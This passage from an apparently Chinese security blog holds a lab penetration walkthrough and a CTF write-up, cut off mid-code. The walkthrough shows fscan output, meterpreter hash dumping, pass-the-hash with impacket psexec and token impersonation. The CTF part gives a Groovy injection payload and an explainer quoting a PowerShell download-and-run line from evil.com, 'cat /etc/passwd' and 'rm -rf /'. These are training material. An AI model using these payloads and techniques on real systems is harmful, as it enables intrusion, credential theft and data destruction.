denied.[*] NetInfo [*]172.22.8.18   [-&gt;]WIN-WEB   [-&gt;]172.22.8.18   [-&gt;]2001:0:348b:fb58:283d:6a0:d89c:1bf3Open result.txt error, open result.txt: Access is denied.[*] NetInfo [*]172.22.8.31   [-&gt;]WIN19-CLIENT   [-&gt;]172.22.8.31Open result.txt error, open result.txt: Access is denied.[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01     #域控      Open result.txt error, open result.txt: Access is denied.[*] NetInfo [*]172.22.8.15   [-&gt;]DC01   [-&gt;]172.22.8.15Open result.txt error, open result.txt: Access is denied.[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393Open result.txt error, open result.txt: Access is denied.[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows ServerOpen result.txt error, open result.txt: Access is denied.[+] mssql 172.22.8.18:1433:sa 1qaz!QAZOpen result.txt error, open result.txt: Access is denied.已完�?16/16[*] 扫描结束,耗时: 9.8116957s[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab  [+] mssql 172.22.8.18:1433:sa 1qaz!QAZ   #本机[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01     #域控     [*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>1</p><h4 id="模拟John的令牌—impacket包中的psexec"><a href="#模拟John的令牌—impacket包中的psexec" class="headerlink" title="模拟John的令牌—impacket包中的psexec"></a>模拟John的令牌—impacket包中的psexec</h4><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; hashdumpAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2caf35bb4c5059a3d50599844e2b9b1f:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::John:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">sudo apt updatesudo apt install -y python3-impacketproxychains psexec.py -hashes :2caf35bb4c5059a3d50599844e2b9b1f administrator@172.22.8.18proxychains impacket-psexec -hashes :2caf35bb4c5059a3d50599844e2b9b1f administrator@172.22.8.18然后C:\Windows\system32&gt; cd C:/1/C:\1&gt; dir Volume in drive C has no label. Volume Serial Number is 4659-5697 Directory of C:\12025/08/04  22:49    &lt;DIR&gt;          .2025/08/04  22:49    &lt;DIR&gt;          ..2025/08/04  21:21             7,168 7.exe2025/08/04  22:49             7,168 77.exe2025/08/04  21:47         7,266,304 fscan.exe2025/08/04  21:50             7,168 shell20.exe2025/08/04  20:55         2,278,912 windows_x64_agent.exe               5 File(s)      9,566,720 bytes               2 Dir(s)  24,716,996,608 bytes freeC:\1&gt; 77.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/fb58431ec52dd885e61e6528b1724696.png"></p><p><a href="https://xz.aliyun.com/news/11323">Impacket脚本利用指南（上）-先知社区</a></p><p>执行exe后再上msf</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt;  use incognitoLoading extension incognito...Success.meterpreter &gt; list_tokens -uDelegation Tokens Available========================================IIS APPPOOL\DefaultAppPoolNT AUTHORITY\LOCAL SERVICENT AUTHORITY\NETWORK SERVICENT AUTHORITY\SYSTEMNT SERVICE\MsDtsServer130NT SERVICE\MSSQLFDLauncherNT SERVICE\MSSQLSERVERNT SERVICE\MSSQLServerOLAPServiceNT SERVICE\ReportServerNT SERVICE\SQLTELEMETRYNT SERVICE\SSASTELEMETRYNT SERVICE\SSISTELEMETRY130WIN-WEB\JohnWindow Manager\DWM-1Window Manager\DWM-2Impersonation Tokens Available========================================No tokens availablemeterpreter &gt; impersonate_token WIN-WEB\\John[+] Delegation token available[+] Successfully impersonated user WIN-WEB\John<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后shell拿即可</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/640564edc28256ae10b6fea27b276156.png"></p><hr><p>2</p><h4 id="msf直接migrate"><a href="#msf直接migrate" class="headerlink" title="msf直接migrate"></a>msf直接migrate</h4><pre class="line-numbers language-none"><code class="language-none">ps选一个与JOhn有关的，explorer.exe （PID为5668）与taskhostw.exe 最稳定<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ea63a4801b0d1d80bb47e203089af66d.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/a27ae2aa314fd7802b09d47a9fbfd637.png"></p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; migrate 5668[*] Migrating from 8956 to 5668...[*] Migration completed successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/09b1fb37b5f51c88d28faaf497b87ea9.png"></p><pre class="line-numbers language-none"><code class="language-none">execute -f powershell.exe -i(我用proxychains msfconsole不行，用msfconsole可以)解决中文乱码问题chcp 65001dir \\tsclient\cdir \\tsclient\c    Ŀ¼: \\tsclient\cMode                LastWriteTime         Length Name----                -------------         ------ ----d-----        2022/5/12     17:04                PerfLogsd-r---        2022/7/11     12:53                Program Filesd-----        2022/5/18     11:30                Program Files (x86)d-r---        2022/7/11     12:47                Usersd-----        2022/7/11     12:45                Windows-a----        2022/7/12     10:34             71 credential.txtcat \\tsclient\c\credential.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8aa076af8227c5e133a645d34a8c7a06.png"></p><hr><p>剩下就是IFEO劫持。之后远程传上马用msf连上再导出hash值，最后hash传递即可。</p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 春秋云镜 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nepctf</title>
      <link href="/2025/08/07/nep/"/>
      <url>/2025/08/07/nep/</url>
      
        <content type="html"><![CDATA[<h3 id="easyGooGooVVVY"><a href="#easyGooGooVVVY" class="headerlink" title="easyGooGooVVVY"></a>easyGooGooVVVY</h3><p><a href="https://xz.aliyun.com/news/7826">从Jenkins RCE看Groovy代码注入-先知社区</a></p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token keyword">def</span> process <span class="token operator">=</span> <span class="token interpolation-string"><span class="token string">""</span></span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">'java.lang.Runtime'</span><span class="token punctuation">)</span>     <span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">'getRuntime'</span><span class="token punctuation">)</span>     <span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span>     <span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'env'</span><span class="token punctuation">)</span><span class="token comment">//process.waitFor()</span>process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>好的，我们来深入探讨一下 <strong>Groovy 表达式注入（Groovy Expression Injection）</strong> 这个安全漏洞。这是一种相当危险的漏洞，因为它通常会导致<strong>远程代码执行（Remote Code Execution, RCE）</strong>。</p><h3 id="1-什么是-Groovy？为什么会有注入问题？"><a href="#1-什么是-Groovy？为什么会有注入问题？" class="headerlink" title="1. 什么是 Groovy？为什么会有注入问题？"></a>1. 什么是 Groovy？为什么会有注入问题？</h3><p>首先，要理解这个漏洞，我们需要知道 Groovy 是什么。</p><ul><li><strong>Groovy 是一种运行在 Java 虚拟机 (JVM) 上的动态语言。</strong> 它的语法与 Java 非常相似，但更简洁、更灵活。</li><li><strong>核心特性：动态执行代码。</strong> Groovy 强大的地方在于它能把字符串当作代码来执行。比如，<code>GroovyShell</code>、<code>Eval</code> 或 <code>ScriptEngine</code> 这些类可以接收一个字符串，然后像执行真正的代码一样去运行它。</li></ul><p><strong>注入问题的根源</strong>就在于这个“动态执行”的特性。如果一个应用程序接收了用户的输入，并且<strong>不加过滤地</strong>将这个输入拼接到了一个将要被 Groovy 引擎执行的字符串中，攻击者就可以构造恶意的输入，让服务器执行任意代码。</p><p>这和 SQL 注入的原理非常相似：</p><ul><li><strong>SQL 注入</strong>：将恶意的 SQL 命令注入到数据库查询中。</li><li><strong>Groovy 注入</strong>：将恶意的 Groovy 代码注入到要执行的脚本中。</li></ul><hr><h3 id="2-Groovy-注入是如何发生的？（一个简单的例子）"><a href="#2-Groovy-注入是如何发生的？（一个简单的例子）" class="headerlink" title="2. Groovy 注入是如何发生的？（一个简单的例子）"></a>2. Groovy 注入是如何发生的？（一个简单的例子）</h3><p>想象一个 Web 应用，它有一个“计算器”功能，允许用户输入一个数学表达式，然后服务器返回计算结果。</p><p><strong>后台的 Java/Groovy 代码可能看起来是这样的：</strong></p><p>Java</p><pre class="line-numbers language-none"><code class="language-none">import groovy.lang.GroovyShell;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class CalculatorController {    @GetMapping("/calculate")    public String calculate(@RequestParam String expression) {        // 创建一个 Groovy 执行环境        GroovyShell shell = new GroovyShell();        // 【漏洞点】直接将用户输入拼接到要执行的脚本中        String script = "result = " + expression;        // 执行脚本        shell.evaluate(script);        // 获取结果并返回        Object result = shell.getVariable("result");        return "计算结果是: " + result;    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>正常使用：</strong></p><p>用户访问 URL: <code>/calculate?expression=3*5</code></p><ol><li><code>expression</code> 变量的值是 <code>"3*5"</code>。</li><li>后台拼接的脚本变成 <code>String script = "result = 3*5";</code>。</li><li>Groovy 引擎执行后，<code>result</code> 的值是 <code>15</code>。</li><li>返回 “计算结果是: 15”。一切正常。</li></ol><p><strong>恶意攻击：</strong></p><p>现在，一个攻击者构造了如下的输入，并对其进行 URL 编码后访问：</p><p>原始恶意输入:</p><p>1.with{new ProcessBuilder(“calc”).start()} (在 Windows 上)</p><p>或者</p><p>1.with{new ProcessBuilder(“gnome-calculator”).start()} (在 Linux 上)</p><p>URL 编码后的请求:</p><p>/calculate?expression=1.with%7Bnew%20ProcessBuilder(%22calc%22).start()%7D</p><ol><li><p><code>expression</code> 变量的值是 <code>"1.with{new ProcessBuilder(\"calc\").start()}"</code>。</p></li><li><p>后台拼接的脚本变成：</p><p>String script = “result = 1.with{new ProcessBuilder("calc").start()}”;</p></li><li><p><strong>灾难发生！</strong> Groovy 引擎开始执行这段代码：</p><ul><li><code>new ProcessBuilder("calc").start()</code> 是标准的 Java/Groovy 代码，它的作用是<strong>创建一个新的操作系统进程</strong>。</li><li>在这里，它会启动 Windows 的计算器程序 (<code>calc.exe</code>)。</li><li><code>.with{}</code> 是 Groovy 的一种语法糖，这里只是为了让代码能被执行。</li></ul></li></ol><p><strong>结果</strong>：在运行这个 Web 应用的服务器上，会突然弹出一个计算器程序。</p><p>这只是一个无害的演示。攻击者完全可以把 <code>"calc"</code> 换成更危险的命令，例如：</p><ul><li><code>"powershell -c 'iex(new-object net.webclient).downloadstring(\'http://evil.com/payload.ps1\')'"</code>: 下载并执行一个恶意的 PowerShell 脚本。</li><li><code>"cat /etc/passwd"</code>: 读取服务器上的敏感文件。</li><li><code>"rm -rf /"</code>: 删除服务器上所有文件（毁灭性打击）。</li></ul><p>这就是<strong>远程代码执行 (RCE)</strong>。攻击者可以在你的服务器上为所欲为。</p><hr><h3 id="3-常见的注入点"><a href="#3-常见的注入点" class="headerlink" title="3. 常见的注入点"></a>3. 常见的注入点</h3><p>Groovy 表达式注入不仅仅发生在 <code>GroovyShell.evaluate()</code>。任何能够动态执行代码的地方都可能成为注入点，例如：</p><ul><li><code>groovy.lang.GroovyShell.evaluate(String script)</code></li><li><code>groovy.lang.GroovyShell.parse(String script)</code></li><li><code>groovy.util.Eval.me(String expression)</code></li><li><code>javax.script.ScriptEngine.eval(String script)</code> (当 ScriptEngine 被配置为 Groovy 时)</li><li>在一些模板引擎中，如果允许执行任意 Groovy 代码。</li></ul><h3 id="4-如何防御-Groovy-表达式注入？"><a href="#4-如何防御-Groovy-表达式注入？" class="headerlink" title="4. 如何防御 Groovy 表达式注入？"></a>4. 如何防御 Groovy 表达式注入？</h3><p>防御的核心思想是：<strong>永远不要相信用户的输入，绝对不要将未经处理的用户输入直接拼接到代码中执行。</strong></p><p>以下是几种主要的防御策略，按推荐程度排序：</p><h4 id="1-避免动态执行代码（最佳策略）"><a href="#1-避免动态执行代码（最佳策略）" class="headerlink" title="1. 避免动态执行代码（最佳策略）"></a><strong>1. 避免动态执行代码（最佳策略）</strong></h4><p>如果业务逻辑允许，<strong>从根本上就不要使用 <code>GroovyShell.evaluate</code> 或类似的功能</strong>。寻找替代方案。例如，如果只是做数学计算，可以使用专门为解析数学公式而设计的库（如 <code>mxparser</code>），而不是一个完整的代码执行引擎。</p><h4 id="2-使用沙箱-Sandbox"><a href="#2-使用沙箱-Sandbox" class="headerlink" title="2. 使用沙箱 (Sandbox)"></a><strong>2. 使用沙箱 (Sandbox)</strong></h4><p>如果必须动态执行 Groovy 代码，一定要把它限制在一个严格的“沙箱”里，控制它能做什么，不能做什么。</p><p>Groovy 提供了 <code>SecureASTCustomizer</code> 和 <code>CompilerConfiguration</code> 来实现沙箱。你可以：</p><ul><li><strong>禁用关键字</strong>：禁止使用 <code>new</code>、<code>while</code> 等关键字。</li><li><strong>白名单导入</strong>：只允许导入安全的类（比如数学计算相关的类）。</li><li><strong>禁用方法调用</strong>：禁止调用危险的方法，如 <code>System.exit()</code> 或 <code>ProcessBuilder.start()</code>。</li><li><strong>限制元编程</strong>：禁止修改类的元数据，防止绕过。</li></ul><p><strong>示例代码 (使用 <code>SecureASTCustomizer</code>)</strong>：</p><p>Java</p><pre class="line-numbers language-none"><code class="language-none">import org.codehaus.groovy.control.CompilerConfiguration;import org.codehaus.groovy.control.customizers.SecureASTCustomizer;import groovy.lang.GroovyShell;// 1. 创建一个编译器配置CompilerConfiguration config = new CompilerConfiguration();SecureASTCustomizer customizer = new SecureASTCustomizer();// 2. 配置沙箱规则// 只允许常量和基本的数学运算符customizer.setAllowedTokens(    // ... 添加允许的 Token ...);// 只允许调用 java.lang.Math 类里的方法customizer.setAllowedImports(    "java.lang.Math");// 禁止所有接收者（即禁止 a.b() 这种形式的调用）// 这是一个非常严格的设置，需要根据业务放宽customizer.setReceiversClasses(    // ... 添加允许的类 ...);config.addCompilationCustomizers(customizer);// 3. 使用带沙箱配置的 GroovyShellGroovyShell shell = new GroovyShell(config);// 此时，如果再执行恶意代码，会直接抛出安全异常try {    shell.evaluate("new ProcessBuilder('calc').start()");} catch (Exception e) {    // 会在这里捕获到一个 SecurityException    e.printStackTrace();}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置沙箱非常复杂且容易出错，需要仔细设计你的白名单和黑名单规则。</p><h4 id="3-输入验证和净化-作为辅助手段"><a href="#3-输入验证和净化-作为辅助手段" class="headerlink" title="3. 输入验证和净化 (作为辅助手段)"></a><strong>3. 输入验证和净化 (作为辅助手段)</strong></h4><p>在将输入传递给 Groovy 引擎之前，对其进行严格的验证。但这非常困难，因为攻击者有无数种方法来混淆和绕过简单的黑名单。</p><ul><li><strong>黑名单（不推荐）</strong>: 过滤 <code>ProcessBuilder</code>, <code>Runtime</code>, <code>exec</code>, <code>invokeMethod</code> 等关键字。很容易被绕过（例如 <code>['Proce','ssBuilder'].join()</code>）。</li><li><strong>白名单（更好）</strong>: 只允许输入包含预期的、安全的字符和模式。例如，如果只做数学计算，可以只允许数字、<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>(</code>, <code>)</code>。</li></ul><p><strong>输入验证只能作为深度防御的一环，绝不能作为唯一的防护措施。</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><table><thead><tr><th>方面</th><th>描述</th></tr></thead><tbody><tr><td><strong>是什么</strong></td><td>一种服务器端漏洞，攻击者通过构造恶意输入，让后台的 Groovy 引擎执行任意代码。</td></tr><tr><td><strong>为什么会发生</strong></td><td>因为应用程序将<strong>未经信任的用户输入</strong>直接拼接到了一个<strong>要动态执行的 Groovy 脚本字符串</strong>中。</td></tr><tr><td><strong>风险</strong></td><td>极高。通常直接导致<strong>远程代码执行 (RCE)</strong>，攻击者可以完全控制服务器。</td></tr><tr><td><strong>如何防御</strong></td><td><strong>首选</strong>：避免动态执行代码。 <strong>次选</strong>：使用配置严格的<strong>沙箱</strong>。 <strong>辅助</strong>：对用户输入进行<strong>白名单验证</strong>。</td></tr><tr><td><strong>核心教训</strong></td><td><strong>代码和数据必须严格分离。</strong> 永远不要把用户输入当作代码来执行。</td></tr></tbody></table><h3 id="1-获取-Runtime-类对象"><a href="#1-获取-Runtime-类对象" class="headerlink" title="1. 获取 Runtime 类对象"></a>1. 获取 <code>Runtime</code> 类对象</h3><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token interpolation-string"><span class="token string">""</span></span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">'java.lang.Runtime'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>""</code> 是字符串实例，<code>"".class</code> 获取 <code>String</code> 类的 <code>Class</code> 对象（仅作为调用 <code>forName</code> 方法的 “跳板”）。</li><li><code>Class.forName('java.lang.Runtime')</code>：通过类的全限定名加载 <code>Runtime</code> 类，返回其 <code>Class</code> 对象（代表 <code>java.lang.Runtime</code> 类）。</li></ul><h3 id="2-获取-getRuntime-方法对象"><a href="#2-获取-getRuntime-方法对象" class="headerlink" title="2. 获取 getRuntime() 方法对象"></a>2. 获取 <code>getRuntime()</code> 方法对象</h3><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">'getRuntime'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>调用 <code>Class</code> 类的 <code>getMethod</code> 方法，获取 <code>Runtime</code> 类中名为 <code>getRuntime</code> 的无参方法。</li><li>等价于获取 <code>Runtime.getRuntime()</code> 这个静态方法的反射对象（<code>Method</code> 实例）。</li></ul><h3 id="3-执行-getRuntime-方法，获取-Runtime-实例"><a href="#3-执行-getRuntime-方法，获取-Runtime-实例" class="headerlink" title="3. 执行 getRuntime() 方法，获取 Runtime 实例"></a>3. 执行 <code>getRuntime()</code> 方法，获取 <code>Runtime</code> 实例</h3><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>调用 <code>Method</code> 类的 <code>invoke</code> 方法执行 <code>getRuntime()</code>。</li><li>因 <code>getRuntime()</code> 是静态方法（无需实例即可调用），参数传入 <code>null</code>，返回 <code>Runtime</code> 类的单例实例（<code>Runtime</code> 是单例模式，全局唯一）。</li></ul><h3 id="4-执行-env-命令，获取进程对象"><a href="#4-执行-env-命令，获取进程对象" class="headerlink" title="4. 执行 env 命令，获取进程对象"></a>4. 执行 <code>env</code> 命令，获取进程对象</h3><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'env'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>调用 <code>Runtime</code> 实例的 <code>exec</code> 方法，执行系统命令 <code>env</code>（用于查看当前环境变量）。</li><li>返回 <code>Process</code> 对象（代表正在执行的 <code>env</code> 进程），后续通过该对象获取命令输出。</li></ul><h3 id="5-读取命令输出结果"><a href="#5-读取命令输出结果" class="headerlink" title="5. 读取命令输出结果"></a>5. 读取命令输出结果</h3><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>process.getInputStream()</code>：获取进程的<strong>标准输出流</strong>（<code>InputStream</code>），命令的执行结果会通过这个流返回（如 <code>env</code> 命令的环境变量列表）。</li><li><code>.text</code>：Groovy 对输入流的扩展方法，自动读取流中所有内容并转换为字符串（底层会处理流的缓冲和关闭，简化了 Java 中手动用 <code>BufferedReader</code> 读取的步骤）。</li></ul></blockquote><hr><h3 id="RevengeGooGooVVVY"><a href="#RevengeGooGooVVVY" class="headerlink" title="RevengeGooGooVVVY"></a>RevengeGooGooVVVY</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>expressinject<span class="token punctuation">.</span></span><span class="token class-name">Test<span class="token punctuation">.</span>Groovy</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>ast<span class="token punctuation">.</span></span><span class="token class-name">ClassNode</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>ast<span class="token punctuation">.</span>expr<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>ast<span class="token punctuation">.</span>expr<span class="token punctuation">.</span></span><span class="token class-name">MethodCallExpression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>control<span class="token punctuation">.</span>customizers<span class="token punctuation">.</span></span><span class="token class-name">SecureASTCustomizer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomGroovyPurifier</span> <span class="token keyword">extends</span> <span class="token class-name">SecureASTCustomizer</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token constant">STRING_METHODS</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">SecureASTCustomizer</span> secureASTCustomizer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecureASTCustomizer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">SecureASTCustomizer</span> <span class="token class-name">CreateASTCustomizer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        secureASTCustomizer<span class="token punctuation">.</span><span class="token function">addExpressionCheckers</span><span class="token punctuation">(</span>expr <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>expr <span class="token keyword">instanceof</span> <span class="token class-name">MethodCallExpression</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token class-name">MethodCallExpression</span> methodCall <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">MethodCallExpression</span><span class="token punctuation">)</span> expr<span class="token punctuation">;</span>                <span class="token class-name">Expression</span> objectExpr <span class="token operator">=</span> methodCall<span class="token punctuation">.</span><span class="token function">getObjectExpression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">ClassNode</span> type <span class="token operator">=</span> objectExpr<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                type<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> typeName <span class="token operator">=</span> type<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> methodName <span class="token operator">=</span> methodCall<span class="token punctuation">.</span><span class="token function">getMethodAsString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">STRING_METHODS</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SecurityException</span><span class="token punctuation">(</span><span class="token string">"Calling "</span><span class="token operator">+</span>methodName<span class="token operator">+</span><span class="token string">"  on "</span><span class="token operator">+</span> <span class="token string">"String is not allowed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>methodName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"execute"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SecurityException</span><span class="token punctuation">(</span><span class="token string">"Calling "</span><span class="token operator">+</span>methodName<span class="token operator">+</span><span class="token string">" on "</span><span class="token operator">+</span> <span class="token string">"is not allowed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        secureASTCustomizer<span class="token punctuation">.</span><span class="token function">setClosuresAllowed</span><span class="token punctuation">(</span><span class="token boolean">false</span><span 